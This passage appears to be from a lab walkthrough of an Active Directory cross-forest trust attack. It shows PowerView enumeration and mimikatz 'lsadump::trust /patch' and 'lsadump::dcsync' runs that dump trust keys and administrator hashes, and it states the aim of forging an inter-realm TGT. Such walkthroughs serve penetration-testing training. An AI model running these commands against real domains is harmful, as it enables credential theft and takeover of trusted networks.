ridsetreferences              : CN=RID Set,CN=finance-dc,OU=Domain Controllers,DC=finance,DC=corp
dnshostname                   : finance-dc.finance.corp

[tech-dc.tech.corp]: PS C:\Temp\Tools> Get-DomainGroup -Domain finance.corp -Identity "Domain Admins" | Get-DomainGroupMember

GroupDomain             : finance.corp
GroupName               : Domain Admins
GroupDistinguishedName  : CN=Domain Admins,CN=Users,DC=finance,DC=corp
MemberDomain            : finance.corp
MemberName              : finadmin
MemberDistinguishedName : CN=finadmin,CN=Users,DC=finance,DC=corp
MemberObjectClass       : user
MemberSID               : S-1-5-21-3132463012-610816204-3671931044-500

[tech-dc.tech.corp]: PS C:\Temp\Tools> Get-DomainUser -Domain tech.corp | Where-Object {$_.serviceprincipalname -like "*finance*"}
[tech-dc.tech.corp]: PS C:\Temp\Tools> Get-DomainComputer -Domain tech.corp | Where-Object {$_.dnshostname -like "*finance*"}
[tech-dc.tech.corp]: PS C:\Temp\Tools> Get-DomainObjectAcl -Domain finance.corp -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -match "^S-1-5-21-1600556212-896947471-994435180"}
[tech-dc.tech.corp]: PS C:\Temp\Tools> Get-DomainUser -Domain tech.corp -LDAPFilter "(description=*finance*)"
[tech-dc.tech.corp]: PS C:\Temp\Tools> Get-DomainUser -Domain tech.corp | Where-Object {$_.memberof -like "*finance*"}
[tech-dc.tech.corp]: PS C:\Temp\Tools> Get-DomainUser -Identity techadmin -Properties *

logoncount             : 21
badpasswordtime        : 9/4/2025 4:14:48 AM
description            : Built-in account for administering the computer/domain
usercertificate        : {48, 130, 6, 89...}
objectclass            : {top, person, organizationalPerson, user}
lastlogontimestamp     : 12/9/2025 6:35:36 AM
name                   : techadmin
objectsid              : S-1-5-21-1600556212-896947471-994435180-500
samaccountname         : techadmin
logonhours             : {255, 255, 255, 255...}
admincount             : 1
codepage               : 0
samaccounttype         : USER_OBJECT
accountexpires         : 1/1/1601 12:00:00 AM
countrycode            : 0
whenchanged            : 12/9/2025 1:32:46 PM
instancetype           : 4
objectguid             : 460bca65-164f-4455-acdc-991ab0d53cc4
lastlogon              : 12/9/2025 1:39:09 PM
lastlogoff             : 1/1/1601 12:00:00 AM
objectcategory         : CN=Person,CN=Schema,CN=Configuration,DC=tech,DC=corp
distinguishedname      : CN=techadmin,CN=Users,DC=tech,DC=corp
dscorepropagationdata  : {9/3/2025 9:54:34 AM, 9/3/2025 9:54:34 AM, 9/3/2025 9:31:15 AM, 1/1/1601 6:12:16 PM}
memberof               : {CN=Group Policy Creator Owners,CN=Users,DC=tech,DC=corp, CN=Domain
                         Admins,CN=Users,DC=tech,DC=corp, CN=Enterprise Admins,CN=Users,DC=tech,DC=corp, CN=Schema
                         Admins,CN=Users,DC=tech,DC=corp...}
whencreated            : 9/3/2025 9:30:36 AM
iscriticalsystemobject : True
badpwdcount            : 0
cn                     : techadmin
useraccountcontrol     : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
usncreated             : 8196
primarygroupid         : 513
pwdlastset             : 12/9/2025 6:36:26 AM
usnchanged             : 38621

[tech-dc.tech.corp]: PS C:\Temp\Tools> .\mimikatz.exe "privilege::debug" "lsadump::trust /patch" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::trust /patch

Current domain: TECH.CORP (TECH / S-1-5-21-1600556212-896947471-994435180)

Domain: FINANCE.CORP (FINANCE / S-1-5-21-3132463012-610816204-3671931044)
 [  In ] TECH.CORP -> FINANCE.CORP
    * 12/9/2025 6:35:37 AM - CLEAR   - 3f 75 8a 6e 16 e6 0e 6c 50 56 c8 46 cf 44 e1 ed b9 41 60 c4 92 79 6d 76 23 c7 a9 9c
        * aes256_hmac       cb15dbff55d2a10ebceb27f34c02647bbbd6c750cdc078f8daf541faa08cd429
        * aes128_hmac       7108e291676d8c2dc09b5c1da1d92db6
        * rc4_hmac_nt       4ed7f2d467624ea5e196e99af3357017

 [ Out ] FINANCE.CORP -> TECH.CORP
    * 12/9/2025 6:35:37 AM - CLEAR   - 3f 75 8a 6e 16 e6 0e 6c 50 56 c8 46 cf 44 e1 ed b9 41 60 c4 92 79 6d 76 23 c7 a9 9c
        * aes256_hmac       bf402cf4279425a2faf3b305e7a271d79d58afc937cae1cf52e46b2748241b56
        * aes128_hmac       21077726c7fd5ae186cd7e53bc4a00b2
        * rc4_hmac_nt       4ed7f2d467624ea5e196e99af3357017

 [ In-1] TECH.CORP -> FINANCE.CORP
    * 12/9/2025 6:35:36 AM - CLEAR   - 2b c3 b7 75 80 a2 5f 23 04 46 14 5f d2 95 04 4b 7b 6f 67 e5 c5 69 8f 06 b8 72 b7 1c
        * aes256_hmac       b8da119799879710a77996794f23f268aedad114ffad1fc37b09f3c4444ca662
        * aes128_hmac       572d3d566968f0780783d7d65ac069ef
        * rc4_hmac_nt       d1758cf58ff8a75bf1d0f7d20d67d3b3

 [Out-1] FINANCE.CORP -> TECH.CORP
    * 12/9/2025 6:35:36 AM - CLEAR   - 2b c3 b7 75 80 a2 5f 23 04 46 14 5f d2 95 04 4b 7b 6f 67 e5 c5 69 8f 06 b8 72 b7 1c
        * aes256_hmac       439f4b6dc3e8dd9693d281dcc4c8d9d59abbc9d54eec6dc6bb8d1d4bd6bad9ec
        * aes128_hmac       162836b675915f23bd725170e63df767
        * rc4_hmac_nt       d1758cf58ff8a75bf1d0f7d20d67d3b3

mimikatz(commandline) # exit
Bye!
[tech-dc.tech.corp]: PS C:\Temp\Tools> Get-DomainUser -Domain finance.corp -SPN

logoncount                    : 0
badpasswordtime               : 1/1/1601 12:00:00 AM
description                   : Key Distribution Center Service Account
distinguishedname             : CN=krbtgt,CN=Users,DC=finance,DC=corp
objectclass                   : {top, person, organizationalPerson, user}
name                          : krbtgt
primarygroupid                : 513
objectsid                     : S-1-5-21-3132463012-610816204-3671931044-502
samaccountname                : krbtgt
admincount                    : 1
codepage                      : 0
samaccounttype                : USER_OBJECT
showinadvancedviewonly        : True
accountexpires                : NEVER
cn                            : krbtgt
whenchanged                   : 9/3/2025 9:52:22 AM
instancetype                  : 4
objectguid                    : 34d41f5d-de71-40ef-96f9-436f26041711
lastlogon                     : 1/1/1601 12:00:00 AM
lastlogoff                    : 1/1/1601 12:00:00 AM
objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=finance,DC=corp
dscorepropagationdata         : {9/3/2025 9:52:22 AM, 9/3/2025 9:29:11 AM, 1/1/1601 12:04:16 AM}
serviceprincipalname          : kadmin/changepw
memberof                      : CN=Denied RODC Password Replication Group,CN=Users,DC=finance,DC=corp
whencreated                   : 9/3/2025 9:29:11 AM
iscriticalsystemobject        : True
badpwdcount                   : 0
useraccountcontrol            : ACCOUNTDISABLE, NORMAL_ACCOUNT
usncreated                    : 12324
countrycode                   : 0
pwdlastset                    : 9/3/2025 9:29:11 AM
msds-supportedencryptiontypes : 0
usnchanged                    : 16422

[tech-dc.tech.corp]: PS C:\Temp\Tools> Get-DomainComputer -Domain finance.corp -Properties dnshostname,serviceprincipalname | Select dnshostname -ExpandProperty serviceprincipalname
Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/finance-dc.finance.corp
TERMSRV/finance-dc
TERMSRV/finance-dc.finance.corp
ldap/finance-dc.finance.corp/ForestDnsZones.finance.corp
ldap/finance-dc.finance.corp/DomainDnsZones.finance.corp
DNS/finance-dc.finance.corp
GC/finance-dc.finance.corp/finance.corp
RestrictedKrbHost/finance-dc.finance.corp
RestrictedKrbHost/finance-dc
RPC/db15945c-510a-4cc5-9162-0218654aff68._msdcs.finance.corp
HOST/finance-dc/FINANCE
HOST/finance-dc.finance.corp/FINANCE
HOST/finance-dc
HOST/finance-dc.finance.corp
HOST/finance-dc.finance.corp/finance.corp
E3514235-4B06-11D1-AB04-00C04FC2DCD2/db15945c-510a-4cc5-9162-0218654aff68/finance.corp
ldap/finance-dc/FINANCE
ldap/db15945c-510a-4cc5-9162-0218654aff68._msdcs.finance.corp
ldap/finance-dc.finance.corp/FINANCE
ldap/finance-dc
ldap/finance-dc.finance.corp
ldap/finance-dc.finance.corp/finance.corp
[tech-dc.tech.corp]: PS C:\Temp\Tools>
```

`MORE ENUM`

```xml
PS C:\Users\studentuser\Desktop> Test-NetConnection -ComputerName finance-dc.finance.corp -Port 445

ComputerName     : finance-dc.finance.corp 
RemoteAddress    : 172.16.3.4                                                                                  
RemotePort       : 445                                                                                         
InterfaceAlias   : Ethernet 2                                                                                  
SourceAddress    : 172.16.100.10                                                                               
TcpTestSucceeded : True

PS C:\Users\studentuser\Desktop> Test-NetConnection -ComputerName finance-dc.finance.corp -Port 135

ComputerName     : finance-dc.finance.corp
RemoteAddress    : 172.16.3.4
RemotePort       : 135
InterfaceAlias   : Ethernet 2
SourceAddress    : 172.16.100.10
TcpTestSucceeded : True

PS C:\Users\studentuser\Desktop> Enter-PSSession -ComputerName tech-dc.tech.corp
[tech-dc.tech.corp]: PS C:\Users\techadmin\Documents> cd C:\Temp\Tools
[tech-dc.tech.corp]: PS C:\Temp\Tools> .\mimikatz.exe "lsadump::dcsync /domain:tech.corp /user:techadmin" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /domain:tech.corp /user:techadmin
[DC] 'tech.corp' will be the domain
[DC] 'tech-dc.tech.corp' will be the DC server
[DC] 'techadmin' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : techadmin

** SAM ACCOUNT **

SAM Username         : techadmin
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 1/1/1601 12:00:00 AM
Password last change : 12/9/2025 6:36:26 AM
Object Security ID   : S-1-5-21-1600556212-896947471-994435180-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: a23a14b2bae1f0ce7460cf0e5321ecac
    ntlm- 0: a23a14b2bae1f0ce7460cf0e5321ecac
    ntlm- 1: 95083a8e0466dca74143bd6dee89abd2
    lm  - 0: 3b9a2f6a51d9c1470a97ed86aeb4d206

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 91128e103f64215a5e8cc480a3fd62ed

* Primary:Kerberos-Newer-Keys *
    Default Salt : TECH.CORPtechadmin
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 653f3007bfd7ee64c83ae22181807d4a924dc473b6fe14fcebb123b89dd85fad
      aes128_hmac       (4096) : dce080333bc6efb0556fd14107734f3d
      des_cbc_md5       (4096) : 40ab38b983d9f79d
    OldCredentials
      aes256_hmac       (4096) : 16ee6f500b8fd096b26c6d901f9aaffff04d14efbe081b64e0f3b5d794d53cd3
      aes128_hmac       (4096) : 766d83fec9d82f6dac3a08fe8066b693
      des_cbc_md5       (4096) : 57ec40454c3b7c51
    OlderCredentials
      aes256_hmac       (4096) : 9cc9c8a3cb927759e6d6d4b7746ab080ec0ae94273aa8fd09541c844cfe325d3
      aes128_hmac       (4096) : 6b5b53d5fac92b77fd56460b856ffeb9
      des_cbc_md5       (4096) : cd4ae65dc8497025

* Primary:Kerberos *
    Default Salt : TECH.CORPtechadmin
    Credentials
      des_cbc_md5       : 40ab38b983d9f79d
    OldCredentials
      des_cbc_md5       : 57ec40454c3b7c51

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  dd910097117768e1673c009ad1d2c1ac
    02  5d64323a888178cce9e01a4e2645b074
    03  23603bb88ce878d57ae83bc91de7fed9
    04  dd910097117768e1673c009ad1d2c1ac
    05  5d64323a888178cce9e01a4e2645b074
    06  90b1ccf0bc3ffe0fe6ef255cb2d6af37
    07  dd910097117768e1673c009ad1d2c1ac
    08  3b57227c3c14025afdb1456cde904531
    09  3b57227c3c14025afdb1456cde904531
    10  33e02d6cdd4438601980b8f854e67a45
    11  cf065be812c415ab8d0864bb4e682745
    12  3b57227c3c14025afdb1456cde904531
    13  79dd6b81c3f93b8e285be119ceb7e6a8
    14  cf065be812c415ab8d0864bb4e682745
    15  72bff58f640141a1ee4be3be0f0e1910
    16  72bff58f640141a1ee4be3be0f0e1910
    17  c4dc6fa1b05253685c7f9b10bf2a12f4
    18  11aceaf548001d219ec0a324fe3a6cce
    19  7a7694f9eb6ea0117e4c6117a05f4442
    20  c0624070d5451ea2fc078974a9c744cd
    21  d667e9650f348c94d0396a2f6b033149
    22  d667e9650f348c94d0396a2f6b033149
    23  615888728e3cdf44c9b386f1faab3d6e
    24  87ddeddbb112695c66975f3f2bb5d3e3
    25  87ddeddbb112695c66975f3f2bb5d3e3
    26  096274cb565c9a5b423c9ed905ac9a01
    27  2a4ac3a70c3be7c4744402c1b799ec95
    28  eaf19fed2ef71937b1b1768763b10182
    29  c7c093ef52225512a6f0f151e2e6316b

mimikatz(commandline) # exit
Bye!
[tech-dc.tech.corp]: PS C:\Temp\Tools> IEX (Get-Content .\PowerView.ps1 -Raw)
[tech-dc.tech.corp]: PS C:\Temp\Tools> Get-DomainObject -Domain tech.corp -LDAPFilter "(objectclass=foreignSecurityPrincipal)"

usncreated             : 8203
name                   : S-1-5-4
whenchanged            : 9/3/2025 9:30:36 AM
objectsid              : S-1-5-4
objectclass            : {top, foreignSecurityPrincipal}
showinadvancedviewonly : True
usnchanged             : 8203
dscorepropagationdata  : {9/3/2025 9:31:15 AM, 1/1/1601 12:00:01 AM}
memberof               : CN=Users,CN=Builtin,DC=tech,DC=corp
cn                     : S-1-5-4
distinguishedname      : CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=tech,DC=corp
whencreated            : 9/3/2025 9:30:36 AM
instancetype           : 4
objectguid             : 5c10e12a-7117-4091-87c1-2837cca57cf0
objectcategory         : CN=Foreign-Security-Principal,CN=Schema,CN=Configuration,DC=tech,DC=corp

usncreated             : 8204
name                   : S-1-5-11
whenchanged            : 9/3/2025 9:30:36 AM
objectsid              : S-1-5-11
objectclass            : {top, foreignSecurityPrincipal}
showinadvancedviewonly : True
usnchanged             : 8204
dscorepropagationdata  : {9/3/2025 9:31:15 AM, 1/1/1601 12:00:01 AM}
memberof               : {CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=tech,DC=corp, CN=Certificate
                         Service DCOM Access,CN=Builtin,DC=tech,DC=corp, CN=Users,CN=Builtin,DC=tech,DC=corp}
cn                     : S-1-5-11
distinguishedname      : CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=tech,DC=corp
whencreated            : 9/3/2025 9:30:36 AM
instancetype           : 4
objectguid             : 8e6601bf-39ea-411b-9758-adefbb6fa558
objectcategory         : CN=Foreign-Security-Principal,CN=Schema,CN=Configuration,DC=tech,DC=corp

usncreated             : 8220
name                   : S-1-5-17
whenchanged            : 9/3/2025 9:30:36 AM
objectsid              : S-1-5-17
objectclass            : {top, foreignSecurityPrincipal}
showinadvancedviewonly : True
usnchanged             : 8220
dscorepropagationdata  : {9/3/2025 9:31:15 AM, 1/1/1601 12:00:01 AM}
memberof               : CN=IIS_IUSRS,CN=Builtin,DC=tech,DC=corp
cn                     : S-1-5-17
distinguishedname      : CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=tech,DC=corp
whencreated            : 9/3/2025 9:30:36 AM
instancetype           : 4
objectguid             : b6b1ebf1-bcaa-4d00-9c05-d784cef10acc
objectcategory         : CN=Foreign-Security-Principal,CN=Schema,CN=Configuration,DC=tech,DC=corp

usncreated             : 12394
name                   : S-1-5-9
whenchanged            : 9/3/2025 9:31:15 AM
objectsid              : S-1-5-9
objectclass            : {top, foreignSecurityPrincipal}
showinadvancedviewonly : True
usnchanged             : 12394
dscorepropagationdata  : {9/3/2025 9:31:15 AM, 1/1/1601 12:00:01 AM}
memberof               : CN=Windows Authorization Access Group,CN=Builtin,DC=tech,DC=corp
cn                     : S-1-5-9
distinguishedname      : CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=tech,DC=corp
whencreated            : 9/3/2025 9:31:15 AM
instancetype           : 4
objectguid             : 531624bc-d669-4181-b175-41a3a8bd197f
objectcategory         : CN=Foreign-Security-Principal,CN=Schema,CN=Configuration,DC=tech,DC=corp

[tech-dc.tech.corp]: PS C:\Temp\Tools> Get-DomainObject -Domain finance.corp -LDAPFilter "(objectclass=foreignSecurityPrincipal)"

objectcategory         : CN=Foreign-Security-Principal,CN=Schema,CN=Configuration,DC=finance,DC=corp
cn                     : S-1-5-4
objectguid             : 626593f2-9bf5-4046-bf09-9ac820ec7205
name                   : S-1-5-4
distinguishedname      : CN=S-1-5-4,CN=ForeignSecurityPrincipals,DC=finance,DC=corp
showinadvancedviewonly : True
objectclass            : {top, foreignSecurityPrincipal}
objectsid              : S-1-5-4

usncreated             : 8204
name                   : S-1-5-11
whenchanged            : 9/3/2025 9:28:33 AM
objectsid              : S-1-5-11
objectclass            : {top, foreignSecurityPrincipal}
showinadvancedviewonly : True
usnchanged             : 8204
dscorepropagationdata  : {9/3/2025 9:29:11 AM, 1/1/1601 12:00:01 AM}
memberof               : {CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=finance,DC=corp, CN=Certificate
                         Service DCOM Access,CN=Builtin,DC=finance,DC=corp,
                         CN=Users,CN=Builtin,DC=finance,DC=corp}
cn                     : S-1-5-11
distinguishedname      : CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=finance,DC=corp
whencreated            : 9/3/2025 9:28:33 AM
instancetype           : 4
objectguid             : 2285d06d-3685-4659-8d07-8dddb6ad011e
objectcategory         : CN=Foreign-Security-Principal,CN=Schema,CN=Configuration,DC=finance,DC=corp

objectcategory         : CN=Foreign-Security-Principal,CN=Schema,CN=Configuration,DC=finance,DC=corp
cn                     : S-1-5-17
objectguid             : b600addf-4c2d-49cb-b6ff-1ea6e028d82a
name                   : S-1-5-17
distinguishedname      : CN=S-1-5-17,CN=ForeignSecurityPrincipals,DC=finance,DC=corp
showinadvancedviewonly : True
objectclass            : {top, foreignSecurityPrincipal}
objectsid              : S-1-5-17

objectcategory         : CN=Foreign-Security-Principal,CN=Schema,CN=Configuration,DC=finance,DC=corp
cn                     : S-1-5-9
objectguid             : 4dad7a8b-34de-483f-9b85-8acb5bcfb580
name                   : S-1-5-9
distinguishedname      : CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=finance,DC=corp
showinadvancedviewonly : True
objectclass            : {top, foreignSecurityPrincipal}
objectsid              : S-1-5-9

[tech-dc.tech.corp]: PS C:\Temp\Tools>
```

from the above commads, we extract `trust keys`  for the both domains in the cross-forest and allows us to forge our own inter-realm TGT*.*

`MORE MORE ENUM`

```xml
[tech-dc.tech.corp]: PS C:\Temp\Tools> Get-DomainUser -Domain finance.corp -Identity finadmin -Properties *

logoncount             : 15
badpasswordtime        : 12/9/2025 2:42:55 PM
description            : Built-in account for administering the computer/domain
usercertificate        : {48 130 6 82 48 130 5 58 160 3 2 1 2 2 19 81 0 0 0 4 49 231 45 204 212 212 90 138 0
                         0 0 0 0 4 48 13 6 9 42 134 72 134 247 13 1 1 11 5 0 48 79 49 20 48 18 6 10 9 146 38
                         137 147 242 44 100 1 25 22 4 99 111 114 112 49 23 48 21 6 10 9 146 38 137 147 242 44
                         100 1 25 22 7 102 105 110 97 110 99 101 49 30 48 28 6 3 85 4 3 19 21 102 105 110 97
                         110 99 101 45 102 105 110 97 110 99 101 45 100 99 45 67 65 48 30 23 13 50 53 48 57
                         48 57 48 53 53 57 52 50 90 23 13 50 54 48 57 48 57 48 53 53 57 52 50 90 48 82 49 20
                         48 18 6 10 9 146 38 137 147 242 44 100 1 25 22 4 99 111 114 112 49 23 48 21 6 10 9
                         146 38 137 147 242 44 100 1 25 22 7 102 105 110 97 110 99 101 49 14 48 12 6 3 85 4 3
                         19 5 85 115 101 114 115 49 17 48 15 6 3 85 4 3 19 8 102 105 110 97 100 109 105 110
                         48 130 1 34 48 13 6 9 42 134 72 134 247 13 1 1 1 5 0 3 130 1 15 0 48 130 1 10 2 130
                         1 1 0 175 30 113 93 140 179 190 105 237 211 144 32 66 36 251 89 219 114 58 160 167
                         220 127 90 235 207 39 70 170 245 119 1 113 168 22 75 227 21 71 28 119 155 148 71 232
                         220 24 163 178 44 154 119 172 99 207 86 143 178 121 122 248 224 29 18 192 0 206 216
                         206 225 0 21 209 15 227 245 10 231 210 238 167 188 100 21 120 139 0 133 129 122 159
                         212 74 125 106 125 184 137 27 114 167 232 245 234 10 198 152 96 32 182 11 109 18 113
                         166 221 18 40 55 175 96 53 241 180 95 16 223 133 72 165 78 141 170 197 154 57 193
                         166 1 81 41 44 93 58 63 25 183 195 211 16 26 196 107 189 136 236 164 227 224 66 17
                         186 226 21 81 24 128 19 246 49 10 135 114 121 127 255 250 40 186 235 239 32 155 140
                         202 177 207 232 240 27 102 240 21 138 228 112 102 77 107 210 115 16 244 119 62 144
                         34 59 201 121 131 71 188 26 189 92 47 132 169 110 126 147 151 254 246 151 189 54 169
                         133 55 79 252 220 208 118 196 178 160 9 68 197 115 239 72 145 192 96 140 84 232 133
                         7 130 207 117 2 3 1 0 1 163 130 3 34 48 130 3 30 48 41 6 9 43 6 1 4 1 130 55 20 2 4
                         28 30 26 0 65 0 100 0 109 0 105 0 110 0 105 0 115 0 116 0 114 0 97 0 116 0 111 0 114
                         48 53 6 3 85 29 37 4 46 48 44 6 10 43 6 1 4 1 130 55 10 3 1 6 10 43 6 1 4 1 130 55
                         10 3 4 6 8 43 6 1 5 5 7 3 4 6 8 43 6 1 5 5 7 3 2 48 14 6 3 85 29 15 1 1 255 4 4 3 2
                         5 160 48 68 6 9 42 134 72 134 247 13 1 9 15 4 55 48 53 48 14 6 8 42 134 72 134 247
                         13 3 2 2 2 0 128 48 14 6 8 42 134 72 134 247 13 3 4 2 2 0 128 48 7 6 5 43 14 3 2 7
                         48 10 6 8 42 134 72 134 247 13 3 7 48 29 6 3 85 29 14 4 22 4 20 88 45 147 108 233
                         151 119 44 38 80 68 211 20 148 97 126 140 111 229 246 48 31 6 3 85 29 35 4 24 48 22
                         128 20 232 223 208 9 72 101 37 27 64 113 94 66 155 35 146 28 196 200 95 128 48 129
                         215 6 3 85 29 31 4 129 207 48 129 204 48 129 201 160 129 198 160 129 195 134 129 192
                         108 100 97 112 58 47 47 47 67 78 61 102 105 110 97 110 99 101 45 102 105 110 97 110
                         99 101 45 100 99 45 67 65 44 67 78 61 102 105 110 97 110 99 101 45 100 99 44 67 78
                         61 67 68 80 44 67 78 61 80 117 98 108 105 99 37 50 48 75 101 121 37 50 48 83 101 114
                         118 105 99 101 115 44 67 78 61 83 101 114 118 105 99 101 115 44 67 78 61 67 111 110
                         102 105 103 117 114 97 116 105 111 110 44 68 67 61 102 105 110 97 110 99 101 44 68
                         67 61 99 111 114 112 63 99 101 114 116 105 102 105 99 97 116 101 82 101 118 111 99
                         97 116 105 111 110 76 105 115 116 63 98 97 115 101 63 111 98 106 101 99 116 67 108
                         97 115 115 61 99 82 76 68 105 115 116 114 105 98 117 116 105 111 110 80 111 105 110
                         116 48 129 200 6 8 43 6 1 5 5 7 1 1 4 129 187 48 129 184 48 129 181 6 8 43 6 1 5 5 7
                         48 2 134 129 168 108 100 97 112 58 47 47 47 67 78 61 102 105 110 97 110 99 101 45
                         102 105 110 97 110 99 101 45 100 99 45 67 65 44 67 78 61 65 73 65 44 67 78 61 80 117
                         98 108 105 99 37 50 48 75 101 121 37 50 48 83 101 114 118 105 99 101 115 44 67 78 61
                         83 101 114 118 105 99 101 115 44 67 78 61 67 111 110 102 105 103 117 114 97 116 105
                         111 110 44 68 67 61 102 105 110 97 110 99 101 44 68 67 61 99 111 114 112 63 99 65 67
                         101 114 116 105 102 105 99 97 116 101 63 98 97 115 101 63 111 98 106 101 99 116 67
                         108 97 115 115 61 99 101 114 116 105 102 105 99 97 116 105 111 110 65 117 116 104
                         111 114 105 116 121 48 48 6 3 85 29 17 4 41 48 39 160 37 6 10 43 6 1 4 1 130 55 20 2
                         3 160 23 12 21 102 105 110 97 100 109 105 110 64 102 105 110 97 110 99 101 46 99 111
                         114 112 48 77 6 9 43 6 1 4 1 130 55 25 2 4 64 48 62 160 60 6 10 43 6 1 4 1 130 55 25
                         2 1 160 46 4 44 83 45 49 45 53 45 50 49 45 51 49 51 50 52 54 51 48 49 50 45 54 49 48
                         56 49 54 50 48 52 45 51 54 55 49 57 51 49 48 52 52 45 53 48 48 48 13 6 9 42 134 72
                         134 247 13 1 1 11 5 0 3 130 1 1 0 36 38 63 139 106 116 61 59 76 175 100 107 63 174
                         146 194 152 143 60 200 80 58 212 154 1 110 17 225 70 239 8 83 167 224 53 246 237 198
                         67 42 105 125 25 85 228 17 188 23 22 151 128 115 26 230 205 156 228 54 194 110 146
                         223 143 203 88 18 127 246 26 130 1 158 145 95 21 236 27 81 70 153 25 149 108 151 228
                         96 73 233 185 239 204 178 111 183 15 181 12 236 3 84 28 127 20 113 223 236 141 191
                         14 197 28 215 52 200 80 240 38 72 49 146 172 165 38 193 21 93 79 247 57 128 216 168
                         216 44 40 192 213 227 58 210 73 44 76 107 69 170 158 234 40 15 162 228 186 136 249
                         216 100 225 25 35 191 29 106 191 242 59 205 106 42 178 161 135 66 168 143 193 174 35
                         22 81 206 26 9 233 252 171 237 22 253 198 139 81 193 21 202 15 79 44 42 45 66 245 86
                         223 172 252 70 139 199 165 44 166 90 180 240 142 232 111 135 59 40 228 161 83 200
                         161 41 247 182 28 32 87 218 137 94 137 207 144 204 162 3 1 199 222 53 173 169 103
                         229 240 67 48 52 172 39 36, 48 130 6 82 48 130 5 58 160 3 2 1 2 2 19 81 0 0 0 3 125
                         59 220 208 5 205 9 210 0 0 0 0 0 3 48 13 6 9 42 134 72 134 247 13 1 1 11 5 0 48 79
                         49 20 48 18 6 10 9 146 38 137 147 242 44 100 1 25 22 4 99 111 114 112 49 23 48 21 6
                         10 9 146 38 137 147 242 44 100 1 25 22 7 102 105 110 97 110 99 101 49 30 48 28 6 3
                         85 4 3 19 21 102 105 110 97 110 99 101 45 102 105 110 97 110 99 101 45 100 99 45 67
                         65 48 30 23 13 50 53 48 57 48 57 48 53 51 54 49 51 90 23 13 50 54 48 57 48 57 48 53
                         51 54 49 51 90 48 82 49 20 48 18 6 10 9 146 38 137 147 242 44 100 1 25 22 4 99 111
                         114 112 49 23 48 21 6 10 9 146 38 137 147 242 44 100 1 25 22 7 102 105 110 97 110 99
                         101 49 14 48 12 6 3 85 4 3 19 5 85 115 101 114 115 49 17 48 15 6 3 85 4 3 19 8 102
                         105 110 97 100 109 105 110 48 130 1 34 48 13 6 9 42 134 72 134 247 13 1 1 1 5 0 3
                         130 1 15 0 48 130 1 10 2 130 1 1 0 210 209 85 145 162 65 24 11 94 183 84 183 163 13
                         41 3 52 157 189 74 46 107 62 74 18 191 69 200 99 34 65 192 218 31 8 177 35 117 236
                         27 13 152 99 231 212 67 209 254 145 83 246 118 199 157 129 141 199 188 93 144 223
                         146 119 78 202 216 197 252 24 244 204 179 71 216 215 209 130 107 2 35 199 86 83 146
                         251 159 229 115 199 112 150 185 142 115 158 197 78 255 136 144 129 225 178 103 16 82
                         97 92 87 209 182 245 158 54 69 162 208 212 210 22 131 81 178 204 144 12 93 34 63 118
                         124 227 122 200 181 113 171 151 238 229 132 219 15 168 220 150 188 149 130 44 241 67
                         91 68 40 100 40 188 8 65 121 198 253 7 128 176 60 52 86 170 29 90 239 117 149 177
                         101 121 62 125 189 46 89 188 114 69 197 36 57 209 23 188 20 53 141 253 198 49 33 58
                         206 24 235 34 189 119 200 186 145 129 169 245 185 87 128 109 165 118 0 30 112 231
                         119 207 198 127 7 9 65 1 50 190 144 61 185 154 239 129 217 110 0 146 251 119 197 250
                         118 208 49 213 119 24 83 219 242 229 2 3 1 0 1 163 130 3 34 48 130 3 30 48 41 6 9 43
                         6 1 4 1 130 55 20 2 4 28 30 26 0 65 0 100 0 109 0 105 0 110 0 105 0 115 0 116 0 114
                         0 97 0 116 0 111 0 114 48 53 6 3 85 29 37 4 46 48 44 6 10 43 6 1 4 1 130 55 10 3 1 6
                         10 43 6 1 4 1 130 55 10 3 4 6 8 43 6 1 5 5 7 3 4 6 8 43 6 1 5 5 7 3 2 48 14 6 3 85
                         29 15 1 1 255 4 4 3 2 5 160 48 68 6 9 42 134 72 134 247 13 1 9 15 4 55 48 53 48 14 6
                         8 42 134 72 134 247 13 3 2 2 2 0 128 48 14 6 8 42 134 72 134 247 13 3 4 2 2 0 128 48
                         7 6 5 43 14 3 2 7 48 10 6 8 42 134 72 134 247 13 3 7 48 29 6 3 85 29 14 4 22 4 20 1
                         96 91 184 7 165 90 204 213 141 48 121 102 82 118 56 187 219 180 175 48 31 6 3 85 29
                         35 4 24 48 22 128 20 232 223 208 9 72 101 37 27 64 113 94 66 155 35 146 28 196 200
                         95 128 48 129 215 6 3 85 29 31 4 129 207 48 129 204 48 129 201 160 129 198 160 129
